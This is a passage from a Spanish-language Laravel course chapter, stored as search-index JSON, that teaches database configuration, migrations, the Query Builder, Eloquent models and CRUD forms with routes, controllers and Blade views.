moderno que simplifica el desarrollo de aplicaciones web, incluyendo la gesti\u00f3n de bases de datos. La integraci\u00f3n con Eloquent, su ORM (Object Relational Mapping), permite trabajar con bases de datos de forma intuitiva y eficiente.</p>"},{"location":"08laravelDatos.html#82-configuracion-inicial","title":"8.2 Configuraci\u00f3n inicial","text":"<p>Laravel soporta varios motores de bases de datos como MySQL, PostgreSQL, SQLite y SQL Server. La configuraci\u00f3n principal se realiza en el archivo <code>.env</code>. </p> <p>Ejemplo de configuraci\u00f3n en .env:</p> <pre><code>DB_CONNECTION=mysql\nDB_HOST=127.0.0.1\nDB_PORT=3306\nDB_DATABASE=nombre_base_datos\nDB_USERNAME=usuario\nDB_PASSWORD=password\n</code></pre> <p>Nota: El servidor MySQL debe estar funcionando con la base de datos ya creada.</p> <p>Probar conexi\u00f3n:</p> <p>Probamos la conexi\u00f3n ejecutando las migraciones:</p> <pre><code>php artisan migrate\n</code></pre> <p>Si todo ha salido bien obtendremos el siguiente resultado donde podremos observar que todas las migraciones se han insertado correctamente en la base de datos.</p> <p>Si nos vamos al cliente que utilicemos para manejar la base de datos (phpMyAdmin por ejemplo) veremos que en nuestra base de datos se han creado todas las tablas de la migraci\u00f3n que hemos ejecutado y adem\u00e1s una tabla que se llama migrations.</p> <p>La tabla <code>migrations</code> es simplemente un registro de todas las migraciones llevadas a cabo.</p> <p>Posibles problemas:</p> <ul> <li>La extensi\u00f3n del driver de la base de datos (como pdo_mysql o pdo_pgsql) debe estar habilitada en el <code>php.ini</code>.</li> <li>Utilizar <code>php artisan config:clear</code> para borrar la cach\u00e9 de configuraciones si los cambios del <code>.env</code> no se reflejan.</li> </ul>"},{"location":"08laravelDatos.html#83-migraciones","title":"8.3 Migraciones","text":""},{"location":"08laravelDatos.html#introduccion","title":"Introducci\u00f3n","text":"<p>Las migraciones son un sistema de control de versiones para bases de datos que permite trabajar de forma colaborativa, manteniendo un hist\u00f3rico de los cambios realizados en el esquema. Con las migraciones se puede: </p> <ul> <li>Crear, modificar y borrar tablas. </li> <li>Gestionar el esquema de forma program\u00e1tica utilizando Artisan y el Schema Builder. </li> <li>Revertir cambios mediante rollback o volver a aplicar todos los cambios con refresh.</li> </ul>"},{"location":"08laravelDatos.html#estructura-de-las-migraciones","title":"Estructura de las migraciones","text":"<p>Las migraciones de un proyecto Laravel se guardan en el directorio database/migrations en archivos <code>.php</code> y siguen una estructura predefinida con dos m\u00e9todos principales: </p> <ul> <li>up: Define las operaciones que deben aplicarse en la base de datos (crear tablas, a\u00f1adir columnas, etc.). </li> <li>down: Define las operaciones inversas para revertir (rollback) los cambios aplicados por up.</li> </ul> <p>Ejemplo:</p> <pre><code>&lt;?php\npublic function up()\n{\n    Schema::create('usuarios', function (Blueprint $tabla) {\n        $tabla-&gt;id();\n        $tabla-&gt;string('nombre');\n        $tabla-&gt;string('email')-&gt;unique();\n        $tabla-&gt;timestamps();\n    });\n}\n\npublic function down()\n{\n    Schema::dropIfExists('usuarios');\n}\n</code></pre> <p>Por defecto, Laravel a\u00f1ade un campo autonum\u00e9rico id y si se llama al m\u00e9todo <code>timestamps()</code>, dos columnas created_at y updated_at que se actualizan autom\u00e1ticamente para saber cu\u00e1ndo se cre\u00f3 y actualiz\u00f3 un registro.</p>"},{"location":"08laravelDatos.html#crear-una-migracion","title":"Crear una migraci\u00f3n","text":"<p>Mediante el comando <code>make:migration</code> de Artisan generamos una migraci\u00f3n, un archivo con las instrucciones (Schema Builder) para construir o cambiar las tablas de la base de datos. En el nombre de dicho archivo se incluye un timestamp para asegurar el orden cronol\u00f3gico.</p> <p>Ejemplos:</p> <pre><code># Migraci\u00f3n en blanco\nphp artisan make:migration nombre_migraci\u00f3n \n\n# Migraci\u00f3n para crear una tabla\nphp artisan make:migration create_table_usuarios --create=usuarios  \n\n# Migraci\u00f3n para modificar una tabla\nphp artisan make:migration add_fields_to_usuarios --table=usuarios \n</code></pre> <p>Laravel puede inferir acciones del nombre de la migraci\u00f3n gracias a la clase TableGuesser. Por ejemplo, si el nombre contiene create o to, Artisan deducir\u00e1 si es para crear o modificar tablas.</p>"},{"location":"08laravelDatos.html#ejecutar-migraciones","title":"Ejecutar migraciones","text":"<ul> <li><code>php artisan migrate</code>: Ejecuta las migraciones pendientes.</li> <li><code>php artisan migrate:status</code>: Muestra el estado de las migraciones.</li> <li><code>php artisan migrate:fresh</code>: Borra todas las tablas de la BDD (sin ejecutar rollback) y ejecuta todas las migraciones.</li> <li><code>php artisan migrate:refresh</code>: Hace un rollback de todas las migraciones y las vuelve a ejecutar. Para rellenar la BDD con datos de prueba, usar el flag --seed.</li> <li><code>php artisan migrate:reset</code>: Hace un rollback de todas las migraciones.</li> <li><code>php artisan migrate:rollback</code>: Revierte la la \u00faltima migraci\u00f3n.</li> </ul>"},{"location":"08laravelDatos.html#schema-builder","title":"Schema Builder","text":"<p>La clase Schema es el kernel para definir y modificar el esquema de las bases de datos. Incluye constructores para crear, modificar y eliminar tablas y columnas. Y es lo que utilizaremos dentro de los archivos de migraciones.</p>"},{"location":"08laravelDatos.html#crear-y-eliminar-tablas","title":"Crear y eliminar tablas","text":"<pre><code>&lt;?php\nSchema::create('usuarios', function (Blueprint $table) {\n    $table-&gt;id();\n    $table-&gt;string('nombre', 32);\n    $table-&gt;timestamps();\n});\n\nSchema::dropIfExists('usuarios');\n</code></pre>"},{"location":"08laravelDatos.html#anadir-y-eliminar-columnas","title":"A\u00f1adir y eliminar columnas","text":"<pre><code>&lt;?php\nSchema::table('usuarios', function (Blueprint $table) {\n    $table-&gt;string('telefono')-&gt;after('nombre')-&gt;nullable();\n});\n\nSchema::table('usuarios', function (Blueprint $table) {\n    $table-&gt;dropColumn('telefono');\n});\n</code></pre>"},{"location":"08laravelDatos.html#tipos-de-columnas","title":"Tipos de columnas","text":"<p>Laravel ofrece una amplia variedad de tipos de columnas que puedes consultar en la documentaci\u00f3n oficial.</p>"},{"location":"08laravelDatos.html#indices","title":"\u00cdndices","text":"<pre><code>&lt;?php\n$table-&gt;primary('id'); // Campo id como clave primaria\n$table-&gt;primary(['nombre', 'apellidos']); // Clave primaria compuesta\n$table-&gt;unique('email'); // Campo email \u00fanico\n$table-&gt;index('localidad'); // Campo localidad como \u00edndice\n</code></pre>"},{"location":"08laravelDatos.html#claves-foraneas","title":"Claves for\u00e1neas","text":"<pre><code>&lt;?php\nSchema::table('posts', function (Blueprint $table) {\n    $table-&gt;unsignedBigInteger('user_id');\n    $table-&gt;foreign('user_id')-&gt;references('id')-&gt;on('usuarios');\n});\n</code></pre> <p>Laravel proporciona mediante el m\u00e9todo <code>foreignId</code> una forma m\u00e1s concisa de hacer lo anterior, creando autom\u00e1ticamente el unsignedBigInteger y determinando la tabla a la que hace referencia (user) por el nombre del campo.</p> <pre><code>&lt;?php\nSchema::table('posts', function (Blueprint $table) {\n    $table-&gt;foreignId('user_id')-&gt;constrained();\n});\n</code></pre> <p>Si la tabla a la que hace referencia no sigue las convenciones de nombres de Laravel, se puede indicar a mano la referencia.</p> <pre><code>&lt;?php\n$table-&gt;foreignId('user_id')-&gt;constrained(\n    table: 'usuarios', indexName: 'id_usuario'\n);\n</code></pre> <p>Y tambi\u00e9n se puede especificar si queremos que los registros de la tabla actual se actualicen o borren en cascada seg\u00fan lo haga el registro de la tabla principal.</p> <pre><code>&lt;?php\n$table-&gt;foreignId('user_id')\n      -&gt;constrained()\n      -&gt;onUpdate('cascade')\n      -&gt;onDelete('cascade');\n</code></pre>"},{"location":"08laravelDatos.html#84-query-builder","title":"8.4 Query Builder","text":"<p>El Query Builder de Laravel proporciona una interfaz fluida para construir y ejecutar consultas de bases de datos. Permite trabajar con varias bases de datos de forma sencilla sin escribir c\u00f3digo SQL.</p> <p>Es ideal para crear consultas personalizadas en las que el rendimiento es una prioridad y consultas complejas que no se pueden expresar f\u00e1cilmente con Eloquent.</p>"},{"location":"08laravelDatos.html#ejemplos-de-consultas","title":"Ejemplos de consultas","text":"<pre><code>&lt;?php\n// Los siguientes ejemplos ir\u00edan en la funci\u00f3n correspondiente del MODELO\n// Para pruebas, de momento tambi\u00e9n puedes ubicarlas en el CONTROLADOR\nuse Illuminate\\Support\\Facades\\DB;\n\n// Obtener todos los registros de users\n$users = DB::table('users')-&gt;get(); \n\n// Filtrar registros\n$users = DB::table('users')-&gt;where('type', 'customer')-&gt;get();\n\n// Seleccionar columnas\n$users = DB::table('users')-&gt;select('name', 'email')-&gt;get();\n\n// Ordenar resultados\n$users = DB::table('users')-&gt;orderBy('name', 'asc')-&gt;get();\n\n// Contar registros\n$count = DB::table('users')-&gt;count();\n\n// Agregados\n$maxSalary = DB::table('employees')-&gt;max('salary');\n\n// Subconsultas\n$users = DB::table('users')\n    -&gt;whereExists(function($query) {\n        $query-&gt;select(DB::raw(1))\n              -&gt;from('orders')\n              -&gt;whereColumn('orders.user_id', 'users.id');\n    })\n    -&gt;get();\n</code></pre>"},{"location":"08laravelDatos.html#ejemplos-de-manipulacion-de-datos","title":"Ejemplos de manipulaci\u00f3n de datos","text":"<pre><code>&lt;?php\nuse Illuminate\\Support\\Facades\\DB;\n\n// Insertar registro\nDB::table('users')-&gt;insert([\n    'name' =&gt; 'John Doe',\n    'email' =&gt; 'john@example.com',\n]);\n\n// Actualizar registro\nDB::table('users')\n    -&gt;where('id', 1)\n    -&gt;update(['name' =&gt; 'Updated Name']);\n\n// Eliminar registro\nDB::table('users')\n    -&gt;where('id', 1)\n    -&gt;delete();\n\n// Borrar todos los registros\nDB::table('users')-&gt;truncate();\n</code></pre>"},{"location":"08laravelDatos.html#85-eloquent-modelos","title":"8.5 Eloquent: Modelos","text":""},{"location":"08laravelDatos.html#introduccion_1","title":"Introducci\u00f3n","text":"<p>Un ORM (Object-Relational Mapping) es una t\u00e9cnica de programaci\u00f3n que permite eliminar la disparidad entre el modelo de datos de una base de datos relacional y el modelo de objetos de una aplicaci\u00f3n. Mientras que en una BDD pensamos en tablas y campos, en el mundo de desarrollo pensamos en objetos y propiedades.</p> <p>Ventajas de un ORM:</p> <ul> <li>Abstracci\u00f3n de la base de datos: No es necesario escribir SQL, ya que el ORM se encarga de traducir las operaciones de la base de datos a objetos.</li> <li>Nombres de campos y tablas: No es necesario recordar los nombres de las tablas y campos, ya que el ORM se encarga de ello. Si cambiamos el nombre de un campo, solo tenemos que cambiarlo en un lugar, en el modelo.</li> <li>Relaciones: Las relaciones entre tablas se pueden definir en los modelos, y el ORM se encarga de gestionarlas. Atravesar relaciones es tan sencillo como acceder a una propiedad de un objeto.</li> </ul> <p>Eloquent es el ORM de Laravel, y nos permite interactuar con la base de datos de una forma sencilla y elegante. Eloquent es una capa de abstracci\u00f3n de la base de datos, que nos permite interactuar con ella utilizando objetos. </p> <p>Cada tabla de la base de datos tiene un modelo asociado, que es una clase que representa a la tabla. Por tanto:</p> <ul> <li>las tablas son modelos</li> <li>los registros de la tabla son instancias de ese modelo</li> <li>los campos de una tabla son propiedades del modelo</li> </ul> Relaci\u00f3n entre tabla y modelo"},{"location":"08laravelDatos.html#modelos","title":"Modelos","text":"<p>Los modelos son uno de los componentes m\u00e1s importantes de Laravel, son los responsables de interactuar con nuestra base de datos de una manera orientada a objetos. Representan las tablas de la base de datos como clases en la aplicaci\u00f3n, permiten realizar operaciones para seleccionar, crear, actualizar y eliminar datos de una manera m\u00e1s sencilla y estructurada.</p>"},{"location":"08laravelDatos.html#crear-un-modelo","title":"Crear un modelo","text":"<p>Los modelos se definen dentro de la carpeta app/Models y se pueden crear mediante Artisan:</p> <pre><code>php artisan make:model Nota -m\n</code></pre> <p>Nombrar correctamente</p> <p>El nombre del modelo empieza por May\u00fascula y siempre se escribe en SINGULAR. </p> <p>Si le pasamos el par\u00e1metro -m adem\u00e1s crear\u00e1 la migraci\u00f3n con el c\u00f3digo para crear la tabla correspondiente en la BDD, cuyo nombre ir\u00e1 en min\u00fascula y plural.</p> Opciones al crear el modelo <p>Podemos a\u00f1adir las siguientes opciones al comando para crear otros elementos relacionados con el modelo:</p> <ul> <li>-c, --controller: Crea un controlador.</li> <li>-m, --migration: Crea una migraci\u00f3n.</li> <li>-r, --resource: Crea un controlador de recursos.</li> <li>-f, --factory: Crea un factory.</li> <li>-s, --seed: Crea un seeder.</li> <li>-a, --all: Crea todo: un controlador de recursos, una migraci\u00f3n, factor\u00eda...</li> </ul> <p>Por ejemplo, si queremos crear un modelo, una migraci\u00f3n y un controlador, ejecutamos:</p> <pre><code>php artisan make:model Nota -cm \n</code></pre> <p>Si todo ha salido bien, veremos en nuestro directorio de migraciones <code>database/migrations</code> un nuevo archivo con un nombre similar a <code>2025_01_21_111237_create_notas_table.php</code> en el que se encuentra la tabla relacionada y que podemos abrir para seguir a\u00f1adiendo campos mediante el Schema Builder como se ha visto anteriormente. Por ejemplo:</p> <pre><code>&lt;?php\n\nSchema::create('notas', function (Blueprint $table) {\n  $table-&gt;id();\n  $table-&gt;timestamps();\n  // Campos a\u00f1adidos\n  $table-&gt;string('titulo'); \n  $table-&gt;text('descripcion');\n  $table-&gt;integer('prioridad');\n});\n</code></pre> <p>Una vez tengamos listo nuestro esquema debemos lanzar <code>php artisan migrate</code> para que ejecute las migraciones pendientes introduciendo la nueva informaci\u00f3n en la base de datos.</p>"},{"location":"08laravelDatos.html#uso-basico-de-un-modelo","title":"Uso b\u00e1sico de un modelo","text":""},{"location":"08laravelDatos.html#recuperar-datos","title":"Recuperar datos","text":"<pre><code>&lt;?php\n// Todos los registros\n$notas = Nota::all();\n\n// Registros filtrados\n$notas = Nota::where('prioridad', '&gt;', 5)-&gt;get();\n\n// Registro \u00fanico\n$nota = Nota::find($id); // devuelve el objeto o null\n$nota = Nota::findOrFail($id); // devuelve el objeto o una excepci\u00f3n, que por ejemplo redirige a una p\u00e1gina 404 no encontrado en el caso de acceder a alguno de sus m\u00e9todos como 'delete'\n</code></pre>"},{"location":"08laravelDatos.html#insertar-datos","title":"Insertar datos","text":"<pre><code>&lt;?php\n// M\u00e9todo 1\n$nota = new Nota();\n$nota-&gt;titulo = \"Proyecto Laravel\";\n$nota-&gt;descripcion = \"Programar la parte de los modelos de la pr\u00e1ctica de F\u00fatbol Femenino.\";\n$nota-&gt;prioridad = 10;\n$nota-&gt;save();\n\n// IMPORTANTE, para los siguientes m\u00e9todos hay que definir en el modelo 'Nota':\n// protected $fillable = ['titulo', 'descripcion', 'prioridad'];\n\n// M\u00e9todo 2\n$nota = new Nota(['titulo' =&gt; $titulo, 'descripcion' =&gt; $descripcion, 'prioridad' =&gt; $prioridad]);\n$nota-&gt;save();\n\n// M\u00e9todo 3: Guardado autom\u00e1tico en BDD\nNota::create(['titulo' =&gt; $titulo, 'descripcion' =&gt; $descripcion, 'prioridad' =&gt; $prioridad]);\n</code></pre>"},{"location":"08laravelDatos.html#actualizar-datos","title":"Actualizar datos","text":"<pre><code>&lt;?php\n// M\u00e9todo 1\n$nota = Nota::find($id);\n$nota-&gt;titulo = \"Nuevo t\u00edtulo\";\n$nota-&gt;save();\n\n// M\u00e9todo 2: Guardado autom\u00e1tico en BDD\nNota::find($id)-&gt;update(['titulo' =&gt; 'Nuevo t\u00edtulo']);\n</code></pre>"},{"location":"08laravelDatos.html#eliminar-datos","title":"Eliminar datos","text":"<pre><code>&lt;?php\n// M\u00e9todo 1: \n$nota = Nota::find($id);\n$nota-&gt;delete(); // Devuelve true/false\n\n// M\u00e9todo 2: Devuelve el n\u00famero de registros eliminados\nNota::destroy($id); // admite un array de ids a eliminar: Nota::destroy([1, 2, 3]);\n</code></pre> Otros m\u00e9todos: updateOrCreate, firstOrCreate, firstOrNew... <p>An\u00edmate a buscar en la documentaci\u00f3n oficial, hay muchos m\u00e1s m\u00e9todos para trabajar con los modelos de Eloquent, como:</p> <ul> <li><code>updateOrCreate()</code>: Busca un registro, si lo encuentra lo actualiza, si no lo crea.</li> <li><code>firstOrCreate()</code>: Busca un registro, si lo encuentra lo devuelve, si no lo crea.</li> <li><code>firstOrNew()</code>: Busca un registro, si lo encuentra lo devuelve, si no devuelve una instancia nueva sin guardar en la BD.</li> </ul> <p>Por ejemplo: Si ya existe un usuario con ese email, actualizar\u00e1 name y password. Si no, crear\u00e1 un nuevo usuario con esos datos.</p> <pre><code>&lt;?php\nUser::updateOrCreate(\n    ['email' =&gt; 'ejemplo@email.com'], // Buscar usuario con este email\n    ['name' =&gt; 'Nuevo Nombre', 'password' =&gt; bcrypt('secreto')]\n);\n</code></pre>"},{"location":"08laravelDatos.html#propiedades-comunes-de-los-modelos-eloquent","title":"Propiedades comunes de los modelos Eloquent","text":"<p>En los modelos podemos definir varias propiedades para configurar el comportamiento de la interacci\u00f3n con la base de datos. A continuaci\u00f3n se detallan las m\u00e1s importantes:</p> <pre><code>&lt;?php\nnamespace App\\Models;\n\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Example extends Model\n{\n    // Especifica el nombre de la tabla si no sigue la convenci\u00f3n de nombres de Laravel\n    protected $table = 'custom_table_name';\n\n    // Define la clave primaria de la tabla\n    protected $primaryKey = 'custom_id';\n    // Indica si la clave primaria es autoincremental\n    public $incrementing = false;\n    // Especifica el tipo de la clave primaria (si no es integer)\n    protected $keyType = 'string';\n\n    // Define qu\u00e9 atributos pueden ser asignados masivamente (a trav\u00e9s de m\u00e9todos como create o update)\n    protected $fillable = ['name', 'email', 'password'];\n    // Contrario a $fillable. Define qu\u00e9 atributos no pueden ser asignados masivamente\n    protected $guarded = ['is_admin'];\n\n    // Define los atributos a ocultar al serializar el modelo (a JSON o array)\n    protected $hidden = ['password', 'remember_token'];\n    // Contrario a $hidden, define los atributos que ser\u00e1n visibles al serializar\n    protected $visible = ['name', 'email'];\n\n    // Transformaci\u00f3n autom\u00e1tica de los atributos a un tipo espec\u00edfico\n    protected $casts = [\n        'is_admin' =&gt; 'boolean',\n        'settings' =&gt; 'array',\n    ];\n\n    // Indica si la tabla tiene los campos `created_at` y `updated_at`\n    public $timestamps = true;\n\n    // Define la conexi\u00f3n a la BDD\n    protected $connection = 'mysql';\n}\n</code></pre>"},{"location":"08laravelDatos.html#ejemplo-recuperar-datos","title":"Ejemplo recuperar datos","text":"<p>Ya tenemos nuestra base de datos creada con las tablas migradas, ahora s\u00f3lo falta rellenarlas con algunos datos de prueba a trav\u00e9s del cliente de MySQL que m\u00e1s nos guste:</p> <ul> <li>PHPMyAdmin</li> <li>MySQL Workbench</li> <li>HeidiSQL</li> </ul> <p>Vamos a ver c\u00f3mo recuperar esos datos desde una vista y lo primero que vamos a necesitar va a ser un controlador para gestionar esas notas:</p> <pre><code>php artisan make:controller NotaController\n</code></pre> <p>Es recomendable seguir la convenci\u00f3n de Laravel de nombres de rutas y funciones de controladores que viemos aqu\u00ed.</p>"},{"location":"08laravelDatos.html#1-rutas","title":"1. Rutas","text":"<p>Creamos la ruta en <code>web.php</code> que redirige a la funci\u00f3n correspondiente del controlador para mostrar todas las notas o una en particular.</p> <pre><code>&lt;?php\n// estamos en \u2593\u2593\u2593 web.php \nRoute::get('notas', [ PagesController::class, 'index' ])-&gt;name('notas.index');\nRoute::get('notas/{id?}', [ PagesController::class, 'show' ])-&gt;name('notas.show');\n</code></pre>"},{"location":"08laravelDatos.html#2-controlador","title":"2. Controlador","text":"<p>Desde la funci\u00f3n del controlador se llama al modelo para recuperar las notas y devuelve la vista pas\u00e1ndoselas.</p> <pre><code>&lt;?php\n// estamos en \u2593\u2593\u2593 NotaController.php \n\n// Muestra listado de notas\npublic function index() {\n  $notas = Nota::all();\n  return view('notas.index', compact('notas'));\n}\n\n// Muestra una nota en espec\u00edfico\npublic function show($id) {\n  $nota = Nota::findOrFail($id);\n  return view('notas.show', compact('nota'));\n}\n</code></pre>"},{"location":"08laravelDatos.html#3-vistas","title":"3. Vistas","text":"<p><code>notas/index.blade.php</code>: Vista con la tabla que pinta los datos mediante las notas pasadadas como par\u00e1metro.</p> <pre><code>&lt;h1&gt;Notas desde base de datos&lt;/h1&gt;\n\n@if(session('mensaje'))\n    &lt;div&gt;{{ session('mensaje') }}&lt;/div&gt;\n@endif\n\n&lt;table border=\"1\"&gt;\n    &lt;thead&gt;\n        &lt;tr&gt;\n            &lt;th&gt;Nombre&lt;/th&gt;\n            &lt;th&gt;Descripci\u00f3n&lt;/th&gt;\n            &lt;th&gt;Prioridad&lt;/th&gt;\n            &lt;th&gt;Editar&lt;/th&gt;\n            &lt;th&gt;Eliminar&lt;/th&gt;\n        &lt;/tr&gt;\n    &lt;/thead&gt;\n\n    @foreach ($notas as $nota)\n        &lt;tr&gt;\n            &lt;td&gt;{{$nota-&gt;titulo}}&lt;/td&gt;\n            &lt;td&gt;{{$nota-&gt;descripcion}}&lt;/td&gt;\n            &lt;td&gt;{{$nota-&gt;prioridad}}&lt;/td&gt;\n            &lt;td&gt;\ud83d\udcdd&lt;/td&gt;\n            &lt;td&gt;\u274c&lt;/td&gt;\n        &lt;/tr&gt;\n    @endforeach\n&lt;/table&gt;\n&lt;p&gt;&lt;a href=\"\"&gt;Nueva nota&lt;/a&gt;&lt;/p&gt;\n</code></pre> <p><code>notas/show.blade.php</code>: Vista con el detalle de una nota en particular. Hace uso de la plantilla que ten\u00edamos y est\u00e1 dentro de la subcarpeta notas.</p> <pre><code>&lt;?php\n// estamos en \u2593\u2593\u2593 notas/show.blade.php\n@extends('plantilla')\n\n@section('apartado')\n  &lt;h1&gt;Detalle de la nota&lt;/h1&gt;\n\n  &lt;p&gt;ID: {{ $nota-&gt;id }}&lt;/p&gt;\n  &lt;p&gt;Nombre: {{ $nota-&gt;titulo }}&lt;/p&gt;\n  &lt;p&gt;Descripci\u00f3n: {{ $nota-&gt;descripcion }}&lt;/p&gt;    \n  &lt;p&gt;Prioridad: {{ $nota-&gt;prioridad }}&lt;/p&gt;     \n@endsection\n</code></pre> <p>Ojo con los nombres</p> <p>Hay que fijarse bien en los nombres de las columnas que tienen nuestras tablas, porque ser\u00e1n los nombres de los atributos de los objetos del modelo que utilizaremos.</p>"},{"location":"08laravelDatos.html#modificar-tablas-sin-perder-datos","title":"Modificar tablas sin perder datos","text":"<p>A veces cometemos errores de dise\u00f1o y queremos introducir una nueva columna dentro de nuestra tabla o modificar una de esas columnas SIN PERDER LOS DATOS DE LA BASE DE DATOS.</p> <p>Imaginemos que en nuestra tabla <code>notas</code> queremos agregar una columna con el nombre <code>autor</code>.</p> <p>Lo primero de todo es crear una nueva migraci\u00f3n para realizar este cambio mediante Artisan con el nombre <code>add_fields_to_</code> seguido del nombre de la tabla a modificar.</p> <pre><code>php artisan migrate add_fields_to_nota\n</code></pre> <p>Seguidamente, abrimos el archivo de la migraci\u00f3n que acabamos de crear y en la funci\u00f3n <code>up()</code> ponemos el cambio que queremos realizar y en <code>down()</code> lo eliminamos para que en caso de hacer una migraci\u00f3n rollback, se vuelva a quedar todo como estaba.</p> <pre><code>&lt;?php\n\npublic function up()\n{\n  Schema::table('notas', function (Blueprint $table) {\n      $table-&gt;string('autor');\n  });\n}\n\npublic function down()\n{\n  Schema::table('notas', function (Blueprint $table) {\n      $table-&gt;dropColumn('autor');\n  });\n}\n</code></pre>"},{"location":"08laravelDatos.html#86-formularios","title":"8.6 Formularios","text":"<p>Ya sabemos c\u00f3mo recuperar datos de una base de datos. Ahora toca ver c\u00f3mo insertarlos, actualizaros y eliminarlos con Laravel y sin escribir ni una sola l\u00ednea de SQL.</p> <p>Es recomendable seguir la convenci\u00f3n de Laravel de nombres de rutas y funciones de controladores que viemos aqu\u00ed.</p>"},{"location":"08laravelDatos.html#insertar-datos_1","title":"Insertar datos","text":"<p>Para insertar datos vamos a necesitar 2 rutas, 2 funciones en el controlador y 1 vista con el formulario:</p> <ul> <li>Con la primera ruta <code>notas/create</code> llamaremos a la funci\u00f3n create del controlador que abrir\u00e1 el formulario para crear una nueva nota.</li> <li>El formulario enviar\u00e1 los datos a la segunda ruta <code>notas</code> mediante POST, la cual llamar\u00e1 a la funci\u00f3n store del controlador para crear la nota mediante el m\u00e9todo save().</li> </ul>"},{"location":"08laravelDatos.html#1-rutas_1","title":"1. Rutas","text":"<p>Creamos las rutas GET y POST con sus alias correspondientes en nuestro archivo de rutas <code>web.php</code>. Situar la ruta <code>notas/create</code> antes de la ruta <code>notas/{id?}</code> porque si no entrar\u00eda siempre en esta \u00faltima.</p> <pre><code>&lt;?php\n// estamos en \u2593\u2593\u2593 web.php\nRoute::get('notas/create', [ NotaController::class, 'create' ])-&gt;name('notas.create');\nRoute::post('notas', [ NotaController::class, 'store' ])-&gt;name('notas.store');\n</code></pre>"},{"location":"08laravelDatos.html#2-controlador_1","title":"2. Controlador","text":"<p>En el controlador creamos los 2 m\u00e9todos: - <code>create</code> para abrir el formulario. - <code>store</code> para crear la nueva nota con los datos que le llegan del formulario mediante Request y almacenarla medidante save() y volvemos a la p\u00e1gina del formulario con el m\u00e9todo back() a\u00f1adiendo un mensaje con with().</p> <pre><code>&lt;?php\n// estamos en \u2593\u2593\u2593 NotaController.php\n\n// Muestra el formulario para crear una nueva nota\npublic function create() {\n    return view('notas.create');\n}\n\n// Crea una nota con la info del formulario\npublic function store(Request $request) {\n    $notaNueva = new Nota();\n    $notaNueva-&gt;titulo = $request-&gt;titulo;\n    $notaNueva-&gt;descripcion = $request-&gt;descripcion;\n    $notaNueva-&gt;prioridad = $request-&gt;prioridad;\n    $notaNueva -&gt; save();\n\n    // Volver al formulario para seguir insertando\n    return back()-&gt;with('mensaje', 'Nota insertada');\n}\n</code></pre>"},{"location":"08laravelDatos.html#3-vista","title":"3. Vista","text":"<p><code>notas/create.blade.php</code>: Vista con el formulario para crear una nueva nota. En el action se indica la ruta a la que enviar los datos por POST.</p> <ul> <li>En el action se indica la ruta a la que enviar los datos por POST.</li> <li>El atributo name de los inputs tiene que ser igual al del campo correspondiente de la tabla.</li> <li>Se usa la cl\u00e1usula de seguridad <code>@csrf</code> para evitar ataques desde otros sitios. M\u00e1s info sobre este ataque.</li> <li>Con session('mensaje') mostramos el mensaje que viene del controlador.</li> </ul> <pre><code>&lt;h2&gt;Crear nueva nota&lt;/h2&gt;\n@if (session('mensaje'))\n    &lt;div class=\"mensaje-nota-creada\"&gt;{{ session('mensaje') }}&lt;/div&gt;\n@endif\n\n&lt;form action=\"{{ route('notas.store') }}\" method=\"POST\"&gt;\n    @csrf {{-- Cl\u00e1usula para obtener un token de formulario al enviarlo --}}\n    &lt;div&gt;\n        &lt;input type=\"text\" name=\"titulo\" placeholder=\"T\u00edtulo de la nota\" autofocus /&gt;\n        &lt;input type=\"text\" name=\"descripcion\" placeholder=\"Descripci\u00f3n de la nota\" /&gt;\n        &lt;input type=\"number\" name=\"prioridad\" placeholder=\"5\" /&gt;\n\n        &lt;button type=\"submit\"&gt;Crear nueva nota&lt;/button&gt;\n    &lt;/div&gt;\n&lt;/form&gt;\n\n&lt;div&gt;&lt;a href=\"{{ route('notas.index') }}\"&gt;Volver&lt;/a&gt;&lt;/div&gt;\n</code></pre>"},{"location":"08laravelDatos.html#4-incluir-enlace-para-insertar","title":"4. Incluir enlace para insertar","text":"<p>En la vista <code>notas/index.blade.php</code> a\u00f1adimos un enlace o bot\u00f3n que abra el formulario para crear una nueva nota.</p> <pre><code>&lt;p&gt;&lt;a href=\"{{ route('notas.create') }}\"&gt;Nueva nota&lt;/a&gt;&lt;/p&gt;\n</code></pre>"},{"location":"08laravelDatos.html#actualizar-datos_1","title":"Actualizar datos","text":"<p>Para actualizar, al igual que para insertar datos, vamos a necesitar 2 rutas, 2 funciones en el controlador y 1 vista con el formulario:</p> <ul> <li>Con la primera ruta <code>notas/{id}/edit</code> llamaremos a la funci\u00f3n edit del controlador que abrir\u00e1 el formulario para modificar la nota.</li> <li>El formulario enviar\u00e1 los datos a la segunda ruta <code>notas/{id}</code> mediante PUT, la cual llamar\u00e1 a la funci\u00f3n update del controlador para actualizar la nota mediante el m\u00e9todo save().</li> </ul>"},{"location":"08laravelDatos.html#1-rutas_2","title":"1. Rutas","text":"<p>Creamos las rutas GET y PUT con sus alias correspondientes en nuestro archivo de rutas <code>web.php</code>.</p> <pre><code>&lt;?php\n// estamos en \u2593\u2593\u2593 web.php\nRoute::get('notas/{id}/edit', [ NotaController::class, 'edit' ])-&gt;name('notas.edit');\nRoute::put('notas/{id}', [ NotaController::class, 'update' ])-&gt;name('notas.update');\n</code></pre>"},{"location":"08laravelDatos.html#2-controlador_2","title":"2. Controlador","text":"<p>En el controlador creamos los 2 m\u00e9todos: - <code>edit</code> para abrir el formulario. - <code>update</code> para actualizar la nota con los datos que le llegan del formulario mediante Request y almacenarla medidante save() y volvemos a la p\u00e1gina del formulario con el m\u00e9todo back() a\u00f1adiendo un mensaje con with().</p> <pre><code>&lt;?php\n// estamos en \u2593\u2593\u2593 NotaController.php\n\n// Muestra el formulario para editar una nota\npublic function edit($id) {\n    $nota = Nota::findOrFail($id);\n    return view('notas.edit', compact('nota'));\n}\n\n// Almacena la info recibida del formulario de edici\u00f3n\npublic function update(Request $request, $id) {\n    $notaUpdate = Nota::findOrFail($id);\n    $notaUpdate-&gt;titulo = $request-&gt;titulo;\n    $notaUpdate-&gt;descripcion = $request-&gt;descripcion;\n    $notaUpdate-&gt;prioridad = $request-&gt;prioridad;\n    $notaUpdate-&gt;save();\n\n    // Volver al listado de notas\n    //return redirect('/notas')-&gt;with('mensaje','Nota actualizada');\n    return redirect()-&gt;route('notas.index')-&gt;with('mensaje','Nota actualizada');\n}\n</code></pre>"},{"location":"08laravelDatos.html#3-vista_1","title":"3. Vista","text":"<p><code>notas/edit.blade.php</code>: Vista con el formulario para actualizar la nota. En el action se indica la ruta a la que enviar los datos por POST.</p> <ul> <li>En el action se indica la ruta a la que enviar los datos junto al id de la nota.</li> 